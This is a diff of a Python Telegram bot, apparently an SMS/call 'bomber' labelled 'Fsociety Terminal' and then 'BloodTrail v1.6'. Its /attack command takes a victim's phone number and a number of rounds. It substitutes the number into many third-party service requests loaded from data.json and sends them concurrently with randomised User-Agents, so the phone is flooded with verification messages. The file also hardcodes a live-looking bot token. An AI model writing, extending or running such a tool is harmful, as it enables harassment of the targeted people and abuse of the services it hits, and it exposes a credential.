@@ -2,119 +2,131 @@ import json
 import asyncio
 import logging
 import aiohttp
+import os
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
 from fake_useragent import UserAgent
 
+# === КОНФИГУРАЦИЯ ===
 TOKEN = "8327514123:AAHlDhGumKA87OPp5cHw4eY65uyGVmIT8B0"
+
+# Определяем путь к файлу базы данных относительно этого скрипта
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DATA_PATH = os.path.join(BASE_DIR, "data.json")
 
 class GlobalState:
     def __init__(self):
         self.is_running = False
-        self.stop_requested = False  # Флаг для остановки
+        self.stop_requested = False
 
 state = GlobalState()
 ua = UserAgent()
 
-# --- ФУНКЦИЯ ОТПРАВКИ ЗАПРОСА ---
-async def send_request(name, url, data):
+# --- ЛОГИКА ОТПРАВКИ ---
+async def send_request(name, url, data, status_list):
     if state.stop_requested:
-        return None
+        return
     
-    headers = {"User-Agent": ua.random, "Content-Type": "application/json"}
+    headers = {
+        "User-Agent": ua.random,
+        "Accept": "application/json",
+        "Content-Type": "application/json"
+    }
     try:
         async with aiohttp.ClientSession() as session:
             async with session.post(url, json=data, headers=headers, timeout=10) as resp:
-                return resp.status
-    except:
-        return "Error"
+                status_list.append(f"✅ {name}: {resp.status}")
+    except Exception as e:
+        status_list.append(f"❌ {name}: Error")
 
-# --- ЛОГИКА АТАКИ ---
+# --- ГЛАВНЫЙ ЦИКЛ ---
 async def start_attack_logic(phone, runs, update, context):
     state.is_running = True
     state.stop_requested = False
     chat_id = update.effective_chat.id
-    
-    # Загружаем сервисы
-    try:
-        with open("data.json", "r", encoding="utf-8") as f:
-            config = json.load(f)
-        services = config["services"]
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"❌ Ошибка JSON: {e}")
+
+    # 1. Пробуем прочитать data.json
+    if not os.path.exists(DATA_PATH):
+        await context.bot.send_message(chat_id=chat_id, text="❌ Ошибка: Файл <code>data.json</code> !", parse_mode='HTML')
         state.is_running = False
         return
 
-    await context.bot.send_message(
-        chat_id=chat_id, 
-        text=f"🚀 <b>Атака на {phone} запущена!</b>\nИспользуйте /stop для завершения.",
-        parse_mode='HTML'
-    )
+    try:
+        with open(DATA_PATH, "r", encoding="utf-8") as f:
+            config = json.load(f)
+        services = config["services"]
+    except Exception as e:
+        await context.bot.send_message(chat_id=chat_id, text=f"❌ Ошибка в структуре JSON: {e}")
+        state.is_running = False
+        return
+
+    await context.bot.send_message(chat_id=chat_id, text=f"🚀 <b>Атака на {phone} запущена!</b>\nСервисов в базе: {len(services)}", parse_mode='HTML')
 
     for i in range(int(runs)):
-        if state.stop_requested:
-            break
-            
-        await context.bot.send_message(chat_id=chat_id, text=f"⏳ Круг {i+1}...")
+        if state.stop_requested: break
         
+        current_logs = []
         tasks = []
-        for name, s in services.items():
-            # Форматируем номер
-            fmt_phone = ''.join(filter(str.isdigit, phone))
-            url = s["url"].replace("%PHONE%", fmt_phone)
-            payload = {k: (v.replace("%PHONE%", fmt_phone) if isinstance(v, str) else v) for k, v in s["data"].items()}
-            
-            tasks.append(send_request(name, url, payload))
-        
-        await asyncio.gather(*tasks)
-        await asyncio.sleep(2) # Пауза между кругами
+        fmt_phone = ''.join(filter(str.isdigit, phone))
 
-    status_msg = "стоп нахуй <b>Атака принудительно остановлена!</b>" if state.stop_requested else "стоп нахуй <b>Атака завершена успешно!</b>"
-    await context.bot.send_message(chat_id=chat_id, text=status_msg, parse_mode='HTML')
-    
+        for name, s in services.items():
+            url = s["url"].replace("%PHONE%", fmt_phone)
+            # Глубокая замена номера в данных
+            payload = {k: (v.replace("%PHONE%", fmt_phone) if isinstance(v, str) else v) for k, v in s["data"].items()}
+            tasks.append(send_request(name, url, payload, current_logs))
+
+        await asyncio.gather(*tasks)
+        
+        # Отправляем краткий отчет по кругу
+        log_text = f"<b>Круг {i+1} завершен.</b>\n" + "\n".join(current_logs[:5]) + "\n..." 
+        await context.bot.send_message(chat_id=chat_id, text=log_text, parse_mode='HTML')
+        await asyncio.sleep(1)
+
+    final_text = "⛔ <b>Остановлено пользователем</b>" if state.stop_requested else "✅ <b>Все круги пройдены!</b>"
+    await context.bot.send_message(chat_id=chat_id, text=final_text, parse_mode='HTML')
     state.is_running = False
-    state.stop_requested = False
 
 # --- ОБРАБОТЧИКИ ---
 
-async def stop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if state.is_running:
-        state.stop_requested = True
-        await update.message.reply_text("Stopping... Остановка процессов. Подождите.")
-    else:
-        await update.message.reply_text("Сейчас нет активных атак.")
-
-async def attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if state.is_running:
-        await update.message.reply_text("⚠️ Система занята! Дождитесь окончания или используйте /stop.")
+        await update.message.reply_text("⚠️ Система занята другой задачей.")
         return
-
     if len(context.args) < 2:
-        await update.message.reply_text("Пример: <code>/attack 77071234567 2</code>", parse_mode='HTML')
+        await update.message.reply_text("Используй: <code>/attack 77071234567 2</code>", parse_mode='HTML')
         return
-
     asyncio.create_task(start_attack_logic(context.args[0], context.args[1], update, context))
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton("стоп нахуй", callback_data='stop_all')]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("<b>Fsociety Terminal</b>\n/attack [номер] [круги]\n/stop - стоп нахуй", reply_markup=reply_markup, parse_mode='HTML')
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state.stop_requested = True
+    await update.message.reply_text("🛑 Сигнал остановки отправлен...")
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("📊 Проверить базу", callback_data='check_db')]]
+    await update.message.reply_text(
+        "<b>Terminal BloodTrail v1.6</b>\n\n"
+        "Для атаки: <code>/attack номер круги</code>\n"
+        "Для стопа: <code>/stop</code>",
+        reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML'
+    )
+
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    if query.data == 'stop_all':
-        state.stop_requested = True
-        await query.edit_message_text("Сигнал остановки отправлен.")
+    if query.data == 'check_db':
+        if os.path.exists(DATA_PATH):
+            with open(DATA_PATH, "r") as f:
+                data = json.load(f)
+            await query.edit_message_text(f"✅ База найдена. Сервисов: {len(data['services'])}")
+        else:
+            await query.edit_message_text("❌ Файл data.json не найден!")
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.INFO)
     app = ApplicationBuilder().token(TOKEN).build()
-    
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("attack", attack_handler))
-    app.add_handler(CommandHandler("stop", stop_handler))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    
-    print(">>> Бот с кнопкой СТОП запущен!")
+    app.add_handler(CommandHandler("attack", attack_command))
+    app.add_handler(CommandHandler("stop", stop_command))
+    app.add_handler(CallbackQueryHandler(callback_handler))
+    print(">>> Бот готов к деплою на хостинг!")
     app.run_polling()
